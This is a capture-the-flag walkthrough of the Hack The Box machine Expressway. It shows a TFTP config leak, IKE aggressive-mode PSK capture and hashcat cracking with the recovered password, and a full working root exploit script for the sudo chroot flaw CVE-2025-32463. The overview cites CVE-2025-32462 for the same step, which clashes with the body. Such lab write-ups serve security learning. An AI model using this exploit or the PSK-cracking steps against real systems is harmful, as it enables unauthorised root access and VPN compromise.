---
title: "Expressway Walkthrough - HTB Easy | IKE Aggressive Mode PSK Crack & Sudo Privilege Escalation"
description: "Complete walkthrough of Expressway from Hack The Box. An easy Linux machine featuring IKE/IPsec enumeration. TCP scanning reveals only SSH on port 22, but UDP enumeration uncovers TFTP and IKE services. A TFTP file leak exposes a Cisco router config revealing a user named ike. IKE aggressive mode is enabled, allowing PSK hash capture and offline cracking with hashcat. Credentials are used to authenticate via SSH and get the user flag. Privilege escalation is achieved by exploiting CVE-2025-32463, a sudo vulnerability, to gain a root shell."
author: dua2z3rr
date: 2026-03-30 1:00:00
categories:
  - HackTheBox
  - Machines
tags: ["vulnerability-assessment", "niche-technologies", "security-operations", "iot", "cryptography", "log-analysis", "password-cracking", "sudo-exploitation"]
image: /assets/img/expressway/expressway-resized.png
---

## Overview

`Expressway` is an easy-difficulty Linux machine that demonstrates enumeration and exploits the IKE service, a component of the `IPsec` framework. Upon leaking the Pre-Shared key of the service and cracking it, the retrieved clear-text credentials are used to access the target via SSH. For privilege escalation, [CVE-2025-32462](https://nvd.nist.gov/vuln/detail/CVE-2025-32462) is exploited to get a privileged shell as the `root` user.

---

## External Enumeration

### Nmap

TCP enumeration reveals only port 22, SSH:

```shell
[Mar 30, 2026 - 19:31:22 (CEST)] exegol-main expressway # nmap expressway.htb -p- -sC -sV -vv
<SNIP>

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

There is nothing we can do with this alone. SSH is a very secure protocol with very few known vulnerabilities. Enumerating UDP ports, we find 4 `open|filtered` ones:

```shell
[Mar 30, 2026 - 19:02:04 (CEST)] exegol-main expressway # nmap expressway.htb -vv -sU
<SNIP>

PORT      STATE         SERVICE   REASON
68/udp    open|filtered dhcpc     no-response
69/udp    open|filtered tftp      no-response
500/udp   open          isakmp    udp-response ttl 63
4500/udp  open|filtered nat-t-ike no-response
35777/udp open|filtered unknown   no-response

<SNIP>
[Mar 30, 2026 - 19:31:05 (CEST)] exegol-main expressway # nmap expressway.htb -vv -sU -p 68,69,500,4500,35777 -sC -sV
<SNIP>

PORT      STATE         SERVICE   REASON              VERSION
68/udp    open|filtered dhcpc     no-response
69/udp    open|filtered tftp      no-response
500/udp   open          isakmp?   udp-response ttl 63
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0
4500/udp  open|filtered nat-t-ike no-response
35777/udp closed        unknown   port-unreach ttl 63

<SNIP>
```

**Key findings:**
- Port 22: **SSH** (OpenSSH 10.0p2 Debian)
- Port 69: **TFTP**
- Port 500: **ISAKMP/IKE** with XAUTH and Dead Peer Detection
- Port 4500: **NAT-T IKE**

---

## Initial Access

### TFTP

We can enumerate TFTP with this nmap script:

```shell
[Mar 30, 2026 - 19:43:45 (CEST)] exegol-main expressway # nmap -n -Pn -sU -p69 -sV --script tftp-enum -vv expressway.htb
<SNIP>

PORT   STATE SERVICE REASON     VERSION
69/udp open  tftp?   script-set
| tftp-enum:
|_  ciscortr.cfg

<SNIP>
```

We notice the presence of a `ciscortr.cfg` file. We can download it using the Metasploit module **auxiliary/admin/tftp/tftp_transfer_util**:

```shell
msf > use auxiliary/admin/tftp/tftp_transfer_util
msf auxiliary(admin/tftp/tftp_transfer_util) > set action Download
action => Download
msf auxiliary(admin/tftp/tftp_transfer_util) > set rhost expressway.htb
rhost => expressway.htb
msf auxiliary(admin/tftp/tftp_transfer_util) > set remote_filename ciscortr.cfg
remote_filename => ciscortr.cfg
msf auxiliary(admin/tftp/tftp_transfer_util) > run
[*] Receiving 'ciscortr.cfg' from expressway.htb:69 as 'ciscortr.cfg'
[*] expressway.htb:69 TFTP transfer operation complete.
[*] Saving ciscortr.cfg as 'ciscortr.cfg'
[*] No database connected, so not actually saving the data:
```

Here is the relevant content of the file:

```
version 12.3
<SNIP>
username ike password *****
<SNIP>
crypto isakmp client configuration group rtr-remote
key secret-password
<SNIP>
crypto ipsec client ezvpn ezvpnclient
connect auto
group 2 key secret-password
mode client
peer 192.168.100.1
<SNIP>
```

We can see the presence of a user named **ike**, but their password is hidden. Let's proceed with IKE enumeration.

### IKE Enumeration

> The IPsec service is recognized as the primary technology for secure communication between LAN-to-LAN networks and for remote access users. It is the **backbone** of VPNs. IKE is used to establish a Security Association (SA) between two hosts, operating under ISAKMP, the key exchange protocol. In short, a channel is created between the two endpoints via a PSK (Pre-Shared Key) or certificates. There are 2 modes: main mode (3 pairs of messages) and aggressive mode. Aggressive mode reduces the number of messages from 6 to 3 (making it faster), but this makes it far less secure because the password hash is sent in plaintext.
{: .prompt-info }

We can enumerate port 500 (IKE) with the ike-scan tool:

```shell
[Mar 30, 2026 - 19:55:36 (CEST)] exegol-main expressway # ike-scan -M expressway.htb
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Main Mode Handshake returned
HDR=(CKY-R=93bf368f7a48302d)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.154 seconds (6.48 hosts/sec).  1 returned handshake; 0 returned notify
```

The `Auth` attribute is set to `PSK` (Pre-Shared Key), that's great news for us. The last line is also very important: `1 returned handshake; 0 returned notify` means the host will allow IKE negotiations.

Let's check for aggressive mode with the `-A` flag:

```shell
[Mar 30, 2026 - 21:34:03 (CEST)] exegol-main expressway # ike-scan -A expressway.htb
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=c354a85b9ddc794e) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```

**Aggressive mode is enabled.** We also get an ID back: `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`.

With this ID we can capture a hash and crack it offline with hashcat:

```shell
[Mar 30, 2026 - 21:37:20 (CEST)] exegol-main expressway # ike-scan -A expressway.htb --pskcrack=hash
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=ea471da55aa7e301) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.154 seconds (6.49 hosts/sec).  1 returned handshake; 0 returned notify
```

### Hash Cracking

```shell
[Mar 30, 2026 - 21:38:25 (CEST)] exegol-main expressway # hashcat -m 5400 hash /opt/lists/rockyou.txt
hashcat (v6.2.6) starting
<SNIP>

5a51a0d1...<SNIP>...c94053e36867bec3822851cade5c5655b46b9816:freakingrockstarontheroad

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: 5a51a0d1...
Time.Started.....: Mon Mar 30 21:39:31 2026 (17 secs)
Time.Estimated...: Mon Mar 30 21:39:48 2026 (0 secs)
<SNIP>
Started: Mon Mar 30 21:38:49 2026
Stopped: Mon Mar 30 21:39:50 2026
```

**Credentials obtained:** `ike:freakingrockstarontheroad`

### SSH

Let's connect with the recovered credentials and grab the user flag:

```shell
[Mar 30, 2026 - 21:40:12 (CEST)] exegol-main expressway # ssh ike@expressway.htb
ike@expressway.htb's password:
<SNIP>
ike@expressway:~$ ls
user.txt
```

**User flag obtained.**

---

## Privilege Escalation

### Internal Enumeration

`sudo -l` prevents us from running commands as root.

The installed sudo version, 1.9.17, is vulnerable to [CVE-2025-32463](https://github.com/K1tt3h/CVE-2025-32463-POC).

> The box is also vulnerable to **CVE-2025-32462**.
{: .prompt-info }

We can grab the script from the repository and execute it to become root:

```shell
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudostage.XXXX)
cd "$STAGE"

cat > xd1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void xd1337(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p xd/etc libnss_
echo "passwd: /xd1337" > xd/etc/nsswitch.conf
cp /etc/group xd/etc/

gcc -shared -fPIC -Wl,-init,xd1337 -o libnss_/xd1337.so.2 xd1337.c

sudo -R xd /bin/true
```

Let's run it:

```shell
ike@expressway:~$ nano exploit.sh
ike@expressway:~$ chmod +x exploit.sh
ike@expressway:~$ ./exploit.sh
root@expressway:~# whoami
root
root@expressway:~# cd /root
root@expressway:/root# ls
root.txt
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

Finding only SSH on TCP made me think the box was going to be a dead end from the start, while the real attack surface was hiding in UDP. TFTP was silently leaking a router config, and IKE was sitting wide open in aggressive mode. It was a great reminder that skipping UDP enumeration is a habit worth breaking.

### Alternative Approaches

For privilege escalation, the box is also vulnerable to **CVE-2025-32462**, which could be used as an alternative path to root.

### Open Question

IKE aggressive mode was deprecated precisely because of this kind of attack, yet here it is, enabled on a Cisco config. How common is it in real enterprise VPN deployments today? And beyond switching to main mode, what does a properly hardened IKE setup actually look like in 2026? Certificate-based auth, IKEv2 or something else?

---

**Completed this box? Have you ever exploited IKE before?** Leave a comment down below!
